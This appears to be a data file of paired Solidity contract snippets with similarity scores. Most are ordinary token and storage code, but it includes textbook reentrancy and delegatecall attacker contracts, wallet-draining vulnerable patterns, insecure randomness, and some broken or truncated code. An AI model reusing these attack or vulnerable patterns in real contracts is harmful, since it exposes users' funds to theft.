    function safeAdd(uint a, uint b) public pure returns (uint c) {

        c = a + b;

        require(c >= a);

    }

    function safeSub(uint a, uint b) public pure returns (uint c) {

        require(b <= a);

        c = a - b;

    }

    function safeMul(uint a, uint b) public pure returns (uint c) {

        c = a * b;

        require(a == 0 || c / a == b);

    }

    function safeDiv(uint a, uint b) public pure returns (uint c) {

        require(b > 0);

        c = a / b;

    }

}"
"contract Victim {

    function withdraw() {
        uint transferAmt= 11;  
        if (!msg.sender.call.value(transferAmt)()) throw; 
    }

    
    function deposit() payable {}
}",0.5989971272840314,"contract IBancorEtherToken is IERC20 {

    function deposit()
        external payable;

    function withdraw(uint256 amount)
        external;
}"
"contract Attacker {

    Victim v;
    uint public count;

    event LogFallback(uint count, uint balance);

    function Attacker(address victim) {
        v = Victim(victim);
    }

    function attack() {
        v.withdraw();
    }

    function () payable {
        count++;
        LogFallback(count, this.balance);
        
        if(count < 10) v.withdraw();
    }

}",0.5677254679362453,"contract GemLike {
    function approve(address, uint) virtual public;
    function transfer(address, uint) virtual public;
    function transferFrom(address, address, uint) virtual public;
    function deposit() virtual public payable;
    function withdraw(uint) virtual public;
}"
"contract TestString {
    function stringConcat(string memory a, string memory b) public pure returns (string memory) {
        bytes memory bytesA = bytes(a);
        bytes memory bytesB = bytes(b);

        bytes memory finalBytes = new bytes(bytesA.length + bytesB.length);

        uint256 k = 0;

        for(uint256 i = 0; i < bytesA.length; i++) {
            finalBytes[k++] = bytesA[i];
        }

        for(uint256 i = 0; i < bytesB.length; i++) {
            finalBytes[k++] = bytesB[i];
        }

        return string(finalBytes);
    }
}",0.5987604715474069,"contract ExmoContest {

    string[] _keys;

    

    constructor(string params) public {

        bytes memory param = """";

        bytes memory byte_params = bytes(params);

        

        for(uint i = 0; i < byte_params.length; i++) {

            if(byte_params[i] == "" ""){

                if(param.length == 0)

                    continue;

                    

                _keys.push(string(param));

                param = """";

            }

            

            param = abi.encodePacked(param, byte_params[i]);

        }

        

        if(param.length != 0)

            _keys.push(string(param));

    }

    

    function YouAreHereAt(uint position) public view returns (string) {

        return _keys[position % _keys.length];

    }



    

}"
"contract Offer { address public owner; struct Offer { string title; string description; uint offerTime; mapping (address => uint) subscribers; mapping (uint => address) subscribersAddress; mapping (uint => uint) nbrSubscribersPerID; uint price; } Offer[] public offers;  function addOffer(string description1, string title1, uint price1,uint offerTime1)  returns (uint, string, string, uint, uint) { uint offerID = offers.length++; Offer o = offers[offerID]; o.description = description1; o.offerTime=offerTime1; o.title = title1; o.price = price1; return (offerID, offers[offerID].description, offers[offerID].title, offers[offerID].price,  offers[offerID].offerTime); }  function returnNbroffer() constant returns(uint) { uint nbr_offer =offers.length; return(nbr_offer); }}",0.5435141163264758,"contract Token {

    function totalSupply() public constant returns (uint);

    function balanceOf(address _owner) public constant returns (uint);

    function allowance(address _owner, address _spender) public constant returns (uint);

    

    function transfer(address _to, uint _value) public returns (bool success);

    function approve(address _spender, uint _value) public returns (bool success);

    function transferFrom(address _from, address _to, uint _value) public returns (bool success);

    

    event Transfer(address indexed from, address indexed to, uint tokens);

    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);



    string public name;

    string public symbol;

    uint8 public decimals;  

}"
"contract Bar {
    uint public x = 0;
    function foo(Relay contractRelay)  {
        x = 2;
        contractRelay.setRelay.value(100)();  
    }
}",0.5794970515281445,"contract ContractReceiver {

    function tokenFallback(address _from, uint _value, bytes memory _data) public {



    }

}"
"contract Contract {

    struct Set {
        uint[] values;
        mapping (uint => bool) is_in;
    }

    Set my_set;

    function add(uint a) public {
        if (!my_set.is_in[a]) {
            my_set.values.push(a);
            my_set.is_in[a] = true;
        }
    }
}",0.5880873797701786,"contract CrypteloERC20{
  mapping (address => uint256) public balanceOf;
  function transfer(address to, uint amount);
  function burn(uint256 _value) public returns (bool success);
}"
"contract ReferenceConsumer {
  AggregatorInterface internal ref;
  
  

  constructor(address _aggregator) public {
    ref = AggregatorInterface(_aggregator);
  }

  function getLatestAnswer() public view returns (int256) {
    return ref.latestAnswer();
  }
}",0.5643432306705208,"contract Sender {
    
    
    constructor() internal {}

    

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; 
        return msg.data;
    }
}"
"contract Offer {

address public owner;
struct Offer {
    string title;
    string description;
    uint  offerTime;
    mapping (address => uint) subscribers;
    mapping (uint => address) subscribersAddress;
    mapping (uint => uint) nbrSubscribersPerID;
    uint price;
}

Offer[] public  offers;



function addOffer(string  description1, string title1, uint price1,uint offerTime1) 
  returns (uint, string, string, uint, uint) {
    uint offerID = offers.length++;
    Offer o = offers[offerID];

    o.description = description1;
    o.offerTime=offerTime1;
    o.title = title1;
    o.price = price1;
    return (offerID, offers[offerID].description, offers[offerID].title, offers[offerID].price, 
      offers[offerID].offerTime);
}


function returnNbroffer() constant returns(uint) {
    uint nbr_offer =offers.length;
    return(nbr_offer);
}

function subscribeOffer(uint offerID) public payable  returns(address,uint,address)   {

      Offer o = offers[offerID];
      uint i=0;
      uint count=0;
         if (msg.value>= o.price)
           { address addre=msg.sender;
             offers[offerID].subscribersAddress[count=++i]=msg.sender;
             offers[offerID].subscribers[msg.sender]=now;
             return(addre,offers[offerID].subscribers[msg.sender],offers[offerID].subscribersAddress[i]);


            }
    offers[offerID].nbrSubscribersPerID[offerID]=count;



}
  function expirationOffer(uint offerID) constant  returns(bool,uint,uint)
  { 
     Offer o = offers[offerID];
     bool expire=false;
     uint timenow=now;
     uint timeSpent=offers[offerID].subscribers[msg.sender]+o.offerTime ;
     if (timenow > timeSpent )
       {expire=true;}
   return(expire,timenow,timeSpent);
   }
 }",0.5491680077497522,"contract ERC20Contract is ERC20 {
    
    string public constant symbol = ""UNIT"";

    
    string public constant name = ""Unilot token"";

    
    uint8 public constant decimals = 18;

    
    mapping(address => uint96) public balances;

    
    mapping(address => mapping (address => uint96)) allowed;

    function totalSupply()
        public
        constant
        returns (uint);


    
    function balanceOf(address _owner)
        public
        constant
        returns (uint balance)
    {
        return uint(balances[_owner]);
    }


    
    function transfer(address _to, uint _amount)
        public
        returns (bool success)
    {
        if (balances[msg.sender] >= _amount
            && _amount > 0
            && balances[_to] + _amount > balances[_to]) {
            balances[msg.sender] -= uint96(_amount);
            balances[_to] += uint96(_amount);
            Transfer(msg.sender, _to, _amount);

            return true;
        } else {
            return false;
        }
    }


    
    
    
    
    
    
    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    )
        public
        returns (bool success)
    {
        if (balances[_from] >= _amount
            && allowed[_from][msg.sender] >= _amount
            && _amount > 0
            && balances[_to] + _amount > balances[_to]) {
            balances[_from] -= uint96(_amount);
            allowed[_from][msg.sender] -= uint96(_amount);
            balances[_to] += uint96(_amount);
            Transfer(_from, _to, _amount);
            return true;
        } else {
            return false;
        }
    }


    
    
    function approve(address _spender, uint _amount)
        public
        returns (bool success)
    {
        allowed[msg.sender][_spender] = uint96(_amount);
        Approval(msg.sender, _spender, _amount);
        return true;
    }


    function allowance(address _owner, address _spender)
        public
        constant
        returns (uint remaining)
    {
        return allowed[_owner][_spender];
    }
}"
"contract Attacker {
    Victim public victimContract;
    uint x;

    function Attacker(){
        victimContract = (new Victim).value(10 wei)();
    }

    function attack(uint y) {
        if (y > x) {
            this.delegatecall(bytes4(sha3('attack(uint256)')), --y);
        }
        else {
            victimContract.donate.value(1)(this, 1);
        }
    }
}",0.5133016439260066,"contract KingOfEthRoadsAbstractInterface {

    

    

    

    

    

    

    function ownerOf(uint _x, uint _y, uint8 _direction) public view returns(address);



    

    

    

    

    

    

    function roadRealtyTransferOwnership(

          uint _x

        , uint _y

        , uint8 _direction

        , address _from

        , address _to

    ) public;

}"
"contract Victim {
    mapping(address => uint) karma;
    function donate(address someAddress, uint amount){
        if(msg.value == amount) {
            someAddress.send(amount);
            karma[msg.sender] += amount;
        }            
    }
}",0.5914640142005139,"contract ProxyEventsEmitter {
    function emitTransfer(address _from, address _to, uint _value);
    function emitApprove(address _from, address _spender, uint _value);
}"
"contract HelloWorld {
  bool isHappy;
  string response = ""Hi there!"";
  modifier onlyIfHappy {
    require(isHappy);
    _;
  }
}",0.5444320529641333,"contract HelloWorld{

    function Hello() public pure returns (string memory){

        return (""Hello World"");

    }

}"
"contract C {
  B b;
  function doBFoo() {
    b.foo();
  }
}",0.569867493396853,"contract Hello {
  function hello() public {
  }
}"
"contract Test {
    uint256 num;

    function computeVote(uint sku, uint sellerId, uint8 _rating) public {
        num = sku + sellerId + _rating;
    }

    function computeVote(uint sku, uint sellerId, uint8 _productRating, uint8 _sellerRating) public {
        num = sku + sellerId + _productRating + _sellerRating;
    }

    function getNum() public view returns (uint256) {
        return num;
    }
}",0.5790025323406335,"contract BrickToken is MintableToken {



    string public constant name = ""The Brick""; 

    string public constant symbol = ""BRK"";

    uint8 public constant decimals = 18;



    function getTotalSupply() view public returns (uint256) {

        return totalSupply;

    }

    

    function transfer(address _to, uint256 _value) public returns (bool) {

        super.transfer(_to, _value);

    }

    

}"
"contract MyContract{
    uint256 public sqrtValue;
    Aion aion;

    constructor(uint256 number) public payable{
        scheduleMyfucntion(number);
    }

    function scheduleMyfucntion(uint256 number) public {
        aion = Aion(0xFcFB45679539667f7ed55FA59A15c8Cad73d9a4E);
        bytes memory data = abi.encodeWithSelector(bytes4(keccak256('myfucntion(uint256)')),number); 
        uint callCost = 200000*1e9 + aion.serviceFee();
        aion.ScheduleCall.value(callCost)( block.timestamp + 1 days, address(this), 0, 200000, 1e9, data, true);
    }

    function myfucntion(uint256 number) public {
        
        scheduleMyfucntion(number);
    } 

    function () public payable {}

}",0.5329411501473024,"contract RandoLotto {
    
    uint256 public highScore;
    address public currentWinner;
    uint256 public lastTimestamp;
    
    constructor () public {
        highScore = 0;
        currentWinner = msg.sender;
        lastTimestamp = now;
    }
    
    function () public payable {
        require(msg.sender == tx.origin);
        require(msg.value >= 0.001 ether);
    
        uint256 randomNumber = uint256(keccak256(blockhash(block.number - 1)));
        
        if (randomNumber > highScore) {
            currentWinner = msg.sender;
            lastTimestamp = now;
        }
    }
    
    function claimWinnings() public {
        require(now > lastTimestamp + 1 days);
        require(msg.sender == currentWinner);
        
        msg.sender.transfer(address(this).balance);
    }
}"
"contract A {

  function SetStruct (Test.TStruct sin) public returns (int) {
    Test.TStruct memory s;
    s.x = sin.x;
    s.y = sin.y;
    return s.x;
  }
}",0.5685726090328229,"contract CodeSize {

    function codeSize(address addr) public view returns (uint) {

        uint size;

        assembly { size := extcodesize(addr) }

        return size;

    }

}"
"contract Test {
        bytes32 name; 

        function go() public {
            name = 'this is a test';
            require(false, ""Error in script"");
            name = 'another test';
        }

}",0.5509715531134118,"contract ERC23 is ERC20{
    function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool success);
}"
"contract testStruct {
    struct stru{
        string[] s;
    }

    stru myStru;

    function add(string s) {
        myStru.s.push(s);
    }

    function getAt(uint256 i) constant returns (string s) {
        s = myStru.s[i];
    }
}",0.5920789245922591,"contract Trusti {
    string data = ""trusti.id"";
    
    function getStore() public view returns (string memory) {
        return data;
    }
    
    function setStore(string memory _value) public {
        data = _value;
    }
}"
"contract example { 
    struct User {
      string name;
      uint level;
      uint[] indexcounter;
    }
    mapping (address => User) userStructs;
    address[] public userAddresses;

    function createUser(string name, uint level)public {

      
      userStructs[msg.sender].name = name;
      
      userStructs[msg.sender].level = level;
      
      userStructs[msg.sender].indexcounter.push(userAddresses.push(msg.sender)-1);
    }

    function getUserByIndex(uint index)view public returns(string,uint,uint[]){
        return(userStructs[userAddresses[index]].name,userStructs[userAddresses[index]].level,userStructs[userAddresses[index]].indexcounter);        
    }

   function getUserByAddress(address userAddress)view public returns(string,uint,uint[]){
        return(userStructs[userAddress].name,userStructs[userAddress].level,userStructs[userAddress].indexcounter);        
    }
}",0.5371049973094767,"contract DataEdit is BasicAccessControl {

    

    struct UserData {

        mapping (string => address) ref;

    }

    mapping (address => UserData) userData;

    mapping (address => mapping(string=>uint)) promotion;



    

    modifier onlyNew(string _gameName){

        require(userData[msg.sender].ref[_gameName] == 0x0,""Can't change reference address"");

        _;

    }



    

    function setUserRef(address _address, address _refAddress, string _gameName) public;

    function changeAmountPromotion(string _gameName, address _address, uint _amount, bool isPlus) public;

    

    function getUserRef(address _address, string _gameName) public view returns(address);

    function getAmountPromotionByAddress(string _gameName, address _address) public view returns (uint);

}"
"contract Div {

    function divider(uint numerator, uint denominator, uint precision) public pure returns(uint) {
        return numerator*(uint(10)**uint(precision))/denominator;
    }
}",0.5826862648738591,"contract SimpleStorage

{

    uint storedData;

    

    function set(uint x) public

    {

        storedData = x;

    }



    function get() public view returns (uint)

    {

        return storedData;

    }

}"
"contract A is IA {
    IB public b;
    function set(address _b) external {b = IB(_b);}
    
}",0.5985034583980062,"contract Token {
  function transfer(address to, uint value) public returns (bool);
}"
"contract TTL_ERC721 {

  mapping(uint256 => uint256) public deadBlockNumbers;

  ...

  function ownerOf(uint256 _tokenId) view public returns (address _owner) {
    if ((deadBlockNumber[_tokenId] == 0) || (block.number > deadBlockNumber[_tokenId])) {
      return ""0x0000000000000000000000000000000000""; 
    }
    return owners[_tokenId];
  }

  function mint(uint256 _tokenId, uint256 _owner, uint256 _blocksFromNow) public {
    
    owners[_tokenId] = _owner;
    deadBlockNumber[_tokenId] = _blocksFromNow;
  }

}",0.5584425534169842,"contract BasicToken is ERC20Basic {

  using SafeMath for uint256;



  mapping(address => uint256) balances;



  uint256 totalSupply_;



  

  function totalSupply() public view returns (uint256) {

    return totalSupply_;

  }



  

  function transfer(address _to, uint256 _value) public returns (bool) {

    require(_to != address(0));

    



    

       return true;

  }



  

  function balanceOf(address _owner) public view returns (uint256 balance) {

    return balances[_owner];

  }



}"
"contract A {
    function a() payable external {
        B bb = new B();
        bb.b.value(msg.value / 2)();
    }
}",0.5982710878387366,"contract ICEther is ICToken {
    function mint() external payable returns (uint);
}"
"contract School {

    struct ClassStruct {
        bytes32 title;
        bytes32 teacher;
        mapping(address => ClassStudentStruct) classStudentStructs;
        address[] studentList;
        bool isClass;
    }

    mapping(bytes32 => ClassStruct) public classStructs; 
    bytes32[] public classList; 

    struct StudentStruct {
        bytes32 name;
        bytes32[] bookList; 
        mapping(bytes32 => bool) isStudentBook;
        bool isStudent;
    }

    mapping(address => StudentStruct) public studentStructs;
    address[] public studentList;

    struct BookStruct {
        bytes32 title;
        bytes32 author;
        bool isBook;
    }

    mapping(bytes32 => BookStruct) public bookStructs;
    bytes32[] public bookList;

    

    struct ClassStudentStruct {
        address student;
        bool tookTest;
        bool isClassStudent;
    }

    function getClassCount()   public constant returns(uint count) { return classList.length; }
    function getStudentCount() public constant returns(uint count) { return studentList.length; }
    function getBookCount()    public constant returns(uint count) { return bookList.length; }

    function newClass(bytes32 classId, bytes32 title, bytes32 teacher) returns(bool success) {
        if(classStructs[classId].isClass) throw; 
        classStructs[classId].title = title;
        classStructs[classId].teacher = teacher;
        classStructs[classId].isClass = true;
        classList.push(classId);
        return true;
    }

    function newStudent(address studentAddress, bytes32 name) returns(bool success) {
        if(studentStructs[studentAddress].isStudent) throw;
        studentStructs[studentAddress].name = name;
        studentList.push(studentAddress);
        studentStructs[studentAddress].isStudent = true;
        studentList.push(studentAddress);
        return true;
    }

    function newBook(bytes32 bookId, bytes32 title, bytes32 author) returns(bool success) {
        if(bookStructs[bookId].isBook) throw;
        bookStructs[bookId].title = title;
        bookStructs[bookId].author = author;
        bookStructs[bookId].isBook = true;
        bookList.push(bookId);
        return true;
    }

    function addClassStuduent(bytes32 classId, address studentAddress) returns(bool success) {
        if(!studentStructs[studentAddress].isStudent) throw; 
        if(!classStructs[classId].isClass) throw; 
        if(classStructs[classId].classStudentStructs[studentAddress].isClassStudent) throw; 

        ClassStudentStruct memory newStudent;
        newStudent.student = studentAddress;
        newStudent.isClassStudent = true;
        classStructs[classId].studentList.push(studentAddress);
        return true;
    }

    function addStudentBook(bytes32 bookId, address studentAddress) returns(bool success) {
        if(!bookStructs[bookId].isBook) throw;
        if(!studentStructs[studentAddress].isStudent) throw;
        if(studentStructs[studentAddress].isStudentBook[bookId]) throw;

        studentStructs[studentAddress].isStudentBook[bookId] = true;
        studentStructs[studentAddress].bookList.push(bookId);
        return true;
    }


    
    

    function delStudentBook(bytes32 bookId, address studentAddress) returns(bool success) {}
    function delClassStudent(bytes32 classId, address studentAddress) returns(bool success) {}

}",0.5130839625956211,"contract UnityToken is ERC223Interface {

  using SafeMath for uint;



  string public constant name = ""Unity Token"";

  string public constant symbol = ""UNT"";

  uint8 public constant decimals = 18;





  

  uint public constant INITIAL_SUPPLY = 100000 * (10 ** uint(decimals));



  mapping(address => uint) balances; 

  mapping(address => bool) allowedAddresses;



  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }



  function addAllowed(address newAddress) public onlyOwner {

    allowedAddresses[newAddress] = true;

  }



  function removeAllowed(address remAddress) public onlyOwner {

    allowedAddresses[remAddress] = false;

  }





  address public owner;



  

  function UnityToken() public {

    owner = msg.sender;

    totalSupply = INITIAL_SUPPLY;

    balances[owner] = INITIAL_SUPPLY;

  }



  function getTotalSupply() public view returns (uint) {

    return totalSupply;

  }



  

  function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {

    if (isContract(_to)) {

      require(allowedAddresses[_to]);

      if (balanceOf(msg.sender) < _value)

        revert();



      balances[msg.sender] = balances[msg.sender].sub(_value);

      balances[_to] = balances[_to].add(_value);

      assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));

      Transfer(msg.sender, _to, _value);

      return true;

    }

    else {

      return transferToAddress(_to, _value);

    }

  }





  

  function transfer(address _to, uint _value, bytes _data) public returns (bool success) {



    if (isContract(_to)) {

      return transferToContract(_to, _value, _data);

    } else {

      return transferToAddress(_to, _value);

    }

  }



  

  

  function transfer(address _to, uint _value) public returns (bool success) {

    

    

    bytes memory empty;

    if (isContract(_to)) {

      return transferToContract(_to, _value, empty);

    }

    else {

      return transferToAddress(_to, _value);

    }

  }



  

  function isContract(address _addr) private view returns (bool is_contract) {

    uint length;

    assembly {

    

      length := extcodesize(_addr)

    }

    return (length > 0);

  }



  

  function transferToAddress(address _to, uint _value) private returns (bool success) {

    if (balanceOf(msg.sender) < _value)

      revert();

    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    Transfer(msg.sender, _to, _value);

    return true;

  }



  

  function transferToContract(address _to, uint _value, bytes _data) private returns (bool success) {

    require(allowedAddresses[_to]);

    if (balanceOf(msg.sender) < _value)

      revert();

    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);

    receiver.tokenFallback(msg.sender, _value, _data);

    Transfer(msg.sender, _to, _value);

    return true;

  }





  function balanceOf(address _owner) public view returns (uint balance) {

    return balances[_owner];

  }



  function allowedAddressesOf(address _owner) public view returns (bool allowed) {

    return allowedAddresses[_owner];

  }

}"
"contract ExchangeTokens {

    address tokenToSend;

    function claimTokens(address tokenSent) {
        uint256 numTokens = ERC20(tokenSent).allowance(msg.sender, this);
        if (numTokens > 0) {
            ERC20(tokenSent).transferFrom(msg.sender, this, numTokens);
            ERC20(tokenToSend).transfer(msg.sender, numTokens);
        }
    }
}",0.5741203904638328,"contract TokenRetriever is ITokenRetriever {

    
    function retrieveTokens(address _tokenContract) public {
        IToken tokenInstance = IToken(_tokenContract);
        uint tokenBalance = tokenInstance.balanceOf(address(this));
        if (tokenBalance > 0) {
            tokenInstance.transfer(msg.sender, tokenBalance);
        }
    }
}"
"contract TestCall {
    Fail f = new Fail();

    
    function test1() public {
        f.fail();
    }

    
    function test2() public {
        f.call(bytes4(keccak256(""fail()"")));
    }
}",0.5913753245228079,"contract DSValue {

    

    function peek() public view returns (bytes32, bool);



    function read() public view returns (bytes32);

}"
"contract Caller1 {

    Contract1 c1;

    constructor(address _address) public {
        c1 = Contract1(_address);
    }

    function voteCandidate() public {
        c1.voteCandidate(msg.sender);
    }
}",0.5895087708490871,"contract Halfer{
    address owner; 
    constructor() public {
        owner = msg.sender;
    }
    
    function() public payable{
        owner.transfer(msg.value/2);
        msg.sender.transfer(address(this).balance);
    }
}"
"contract ReferenceConsumer {
  AggregatorInterface internal ref;

  constructor(address _aggregator) public {
    ref = AggregatorInterface(_aggregator);
  }

  function getLatestAnswer() public returns (int256) {
    return ref.latestAnswer();
  }

  function getLatestTimestamp() public returns (uint256) {
    return ref.latestTimestamp();
  }

  function getPreviousAnswer(uint256 _back) public returns (int256) {
    uint256 latest = ref.latestRound();
    require(_back <= latest, ""Not enough history"");
    return ref.getAnswer(latest - _back);
  }

  function getPreviousTimestamp(uint256 _back) public returns (uint256) {
    uint256 latest = ref.latestRound();
    require(_back <= latest, ""Not enough history"");
    return ref.getTimestamp(latest - _back);
  }
}",0.5928553900622405,"contract CSTRegistry {

  function getGeohash(bytes32 cst) public view returns (bytes32 geohash);

  function getRadius(bytes32 cst) public view returns (uint256 radius);

  function getCreatedOn(bytes32 cst) public view returns (uint256 timestamp);

  function getDeletedOn(bytes32 cst) public view returns (uint256 timestamp);



  function isTracked(bytes32 cst) public view returns (bool);



  event TrackedToken(bytes32 cst, address indexed nftAddress, uint256 tokenID, bytes32 geohash, uint256 radius);









  function computeCST(address nftContract, uint256 tokenID) public pure returns (bytes32) {

    return keccak256(abi.encodePacked(nftContract, tokenID));

  }

}"
"contract B {
    function delegateIncrement(address aaddr, uint add) {
        A(aaddr).increment(add) ; 
    }
}",0.5900071299343317,"contract ElcoinDb {
    function getBalance(address addr) constant returns(uint balance);
}"
"contract Outer {
   function callInnerWithCurrentTime(address inner) {
     Inner(inner).someFunction(now);
   }
}",0.5065916945528,"contract ITransferableOwnership {
    

    
    function transferOwnership(address _newOwner) external;
}"
"contract MyContract {

  struct Person {
    uint age;
    uint size;
  }

  
  Person[] persons;


  
  uint256[] personIds;

  
  mapping (uint256 => uint256) personIdToIndex;

  modifier personExists(uint256 _id) {
    uint256 index = personIdToIndex[_id]; 
    require(personIds[index] == _id, ""Person does not exist."");

    _;
  }

  event PersonAdded(uint indexed id, uint age, uint size);

  function addPerson(uint _age, uint _size) public {
    Person memory person = Person(_age, _size);
    id = persons.push(person) - 1;

    uint256 key = personIds.push(id) - 1;
    personIdToIndex[id] = key;

    emit PersonAdded(id, _age, _size)
  }

  function removePerson(uint _id) personExists(_id) public {
    delete persons[_id]

    
    uint256 key = personIdToIndex[_id];

    
    personIds[key] = personIds[personIds.length - 1];

    
    personIdToIndex[personIds[key]] = key;

    
    personIds.length--;
  }
}",0.5278406827919182,"contract ProofOfExistence{

    
    string public created;
    address public manager; 
    uint256 public index;   
    mapping (uint256 => Doc) public docs; 
    

    

    struct Doc {
        string publisher; 
        uint256 publishedOnUnixTime; 
        uint256 publishedInBlockNumber; 
        string text; 
    }

    

    function ProofOfExistence(){
        manager = msg.sender;
        created = ""cryptonomica.net"";
        index = 0; 
    }

    
    
    event DocumentAdded(uint256 indexed index,
                        string indexed publisher,
                        uint256 publishedOnUnixTime,
                        string indexed text);

    

    function addDoc(string _publisher, string _text) returns (uint256) {
        
        if (msg.sender != manager) throw;
        
        index += 1;
        
        docs[index] = Doc(_publisher, now, block.number, _text);
        
        DocumentAdded(index,
                      docs[index].publisher,
                      docs[index].publishedOnUnixTime,
                      docs[index].text);
        
        return index;
    }

    

    function () {
        
        
        
        
        
        
        throw;
    }

}"
"contract Ballot {
    
    Arithmetic.Data d;

    
    using Arithmetic for Arithmetic.Data;

    function bar(bytes1 a) public view returns (uint8) {
        
        
        bytes1 b = d.doSomeMath(a, 3);
        return uint8(b);
    }
}",0.5879375509098489,"contract Trusti {
    string data = ""trusti.id"";
    
    function getStore() public view returns (string memory) {
        return data;
    }
    
    function setStore(string memory _value) public {
        data = _value;
    }
}"
"contract exampleContract {

    event Debug(bool destroyed); 

    constructor () public {

    
    
    function _destroyContract() internal {
        emit Debug(true); 
        
        selfdestruct(this); 
    }
}",0.548528062969364,"contract Mortal {

    

    address owner;



    

    constructor() public { owner = msg.sender; }



    

    function kill() public { if (msg.sender == owner) selfdestruct(owner); }

}"
"contract RPG {
    enum Armor {Chest, Helm, Boots, Leggings, Gloves, Shield} 
    enum Weapon {Sword, Axe, Wand, Gun, Hammer, Fist}

    struct CharacterStruct {string name;
                      bool isCharacter;
                      uint dna;
                      Armor[] armors; 
                      Weapon[] weapons;                  
        }

    mapping(address => CharacterStruct) public characterStructs;
    address[] public characters;

    modifier onlyIfRegistered() {
        require(characterStructs[msg.sender].isCharacter);
        _;
    }

    function register() public returns(bool success) {
        require(!characterStructs[msg.sender].isCharacter);
        characters.push(msg.sender);
        characterStructs[msg.sender].isCharacter = true;
        return true;
    }

    function addArmor(Armor a) public onlyIfRegistered returns(bool success) {
        characterStructs[msg.sender].armors.push(a);
        return true;
    }

    function getArmor(address player, uint row) public view returns(Armor armor) {
        return characterStructs[player].armors[row];
    }

}",0.5712798365188471,"contract Lottery {

    

    address public manager;

    address[] public players;

    address public winner;

    event Transfer(address indexed to, uint256 value);

    

    function Lottery () public {

        manager = msg.sender;

    }

    

    

    function enter() public payable {

        

        require(msg.value > .01 ether);

        

        players.push(msg.sender);

        

    }

    

    function random() private view returns (uint) {

        return uint(keccak256(block.difficulty, now, players));

    }

    

    function pickWinner() public restricted returns (address[]) {

        uint index = random() % players.length;

        winner =  players[index];

        winner.transfer(this.balance);

        emit Transfer(winner,this.balance);

        players = new address[](0);

        return players;

    }

    

    modifier restricted(){

        require(msg.sender == manager);

        _;

    }



    function getContractBalance() public view returns (uint) {

        return this.balance;

    }



    function getPlayers() public view returns (address[]){

        return players;

    }

}"
"contract Example {
    function testRecovery(bytes32 h, uint8 v, bytes32 r, bytes32 s) returns (address) {
        bytes memory prefix = ""\x19Ethereum Signed Message:\n32"";
        bytes32 prefixedHash = sha3(prefix, h);
        address addr = ecrecover(prefixedHash, v, r, s);

        return addr;
    }
}",0.5576363984561032,"contract TransferableMultsig {

    

    function execute(

        uint8[]   sigV,

        bytes32[] sigR,

        bytes32[] sigS,

        address   destination,

        uint      value,

        bytes     data

        )

        external;

    

    function transferOwnership(

        uint8[]   sigV,

        bytes32[] sigR,

        bytes32[] sigS,

        uint      _threshold,

        address[] _owners

        )

        external;

}"
"contract Hacker {
    Dao dao;
    address userAddress; 
    string userName;

    constructor(string _userName, address daoAddress) public {
        dao = Dao(daoAddress);
        userAddress = msg.sender;
        userName = _userName;
    }

    function addToBalence(string name, uint amount) public payable {
        dao.addToBalence.value(msg.value)(userName); 
    }
}",0.5785684980163526,"contract RobetTest {

    string public name;

    mapping (address => mapping (string => uint256)) private bets;

    constructor()  public {

        name = 'RobetTest';

    }

    function insertBet(string memory bid, address addr, uint256 _value) public returns (bool success) {

        bets[addr][bid] = _value;

        return true;

    }

}"
"contract Other {
    One public myOne = new One();

    function doSomething() public {
        myOne.u = 123; 
    }
}",0.5957586453536777,"contract Ownable {
  address public owner;

  function Ownable() public {
    owner = msg.sender;
  }
}"
"contract ParserDemo {
  uint public min;
  address public who;
  string public message;
  event Parsed(uint _min, address _who, string _message);
  event Data(bytes _message);
  function test(bytes data) public {
    address a = this;
    assembly {
      if iszero(delegatecall(gas, a, add(data, 32), mload(data), 0, 0)) {
          revert(0, 0)
      }
    }
  }
  function parser(uint _min, address _who, string _message) public {
    min = _min;
    who = _who;
    message = _message;
    emit Parsed(_min, _who, _message);
  }

}",0.5972071433362167,"contract Cert is MintableToken {
    string public name = ""DecenterUni Biz Pre 2"";
    string public symbol = ""DUBP2"";
    uint8 public decimals = 0;
    uint public INITIAL_SUPPLY = 0;

    constructor () public {
    }

    event memo(string _memo);

    function mintWithMemo(string _memo, address _to, uint256 _amount) public {
        mint(_to, _amount);
        emit memo(_memo);
    }
    
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(msg.sender == owner);
        super.transfer(_to, _value);
    }
}"
"contract AuctionSystem { event AuctionEnded(string indexed _name, address _winner); event NewBid(string indexed _name, address _bidder, uint _value);  function onAuctionEnd(string _name) internal; function bid(string _name, address _bidder, uint _value) internal { var auction = m_auctions[_name]; if (auction.endDate > 0 && now > auction.endDate) { AuctionEnded(_name, auction.highestBidder); onAuctionEnd(_name); delete m_auctions[_name]; return; } if (msg.value > auction.highestBid) {  auction.secondHighestBid = auction.highestBid; auction.sumOfBids += _value; auction.highestBid = _value; auction.highestBidder = _bidder; auction.endDate = now + c_biddingTime; NewBid(_name, _bidder, _value); } } uint constant c_biddingTime = 7 days; struct Auction { address highestBidder; uint highestBid; uint secondHighestBid; uint sumOfBids; uint endDate; } mapping(string => Auction) m_auctions;}",0.5392563554956059,"contract ERC20 {
    string public symbol;
    string public name;
    uint8 public decimals;
    uint256 _totalSupply;
    
    mapping(address => uint256) balances;
    mapping(address => mapping (address => uint256)) allowed;
    
    function totalSupply() constant returns (uint256 totalSupply);
    function balanceOf(address _owner) constant returns (uint256 balance);
    function transfer(address _to, uint256 _value) returns (bool success);
    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);
    function approve(address _spender, uint256 _value) returns (bool success);
    function allowance(address _owner, address _spender) constant returns (uint256 remaining);
    
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}"
"contract Str {

    event LogX(string thing);

    function x(string something) public returns(string success) {
        LogX(something);
        return something;
    }
}",0.5917792098236483,"contract IParityRegistry {
    mapping (bytes4 => string) public entries;
    
    function register(string memory _method)
    public
    returns (bool);
}"
"contract Try {

    Str s;

    function Try(string that) {
        s = new Str();
        string set = s.x(that); 
    }
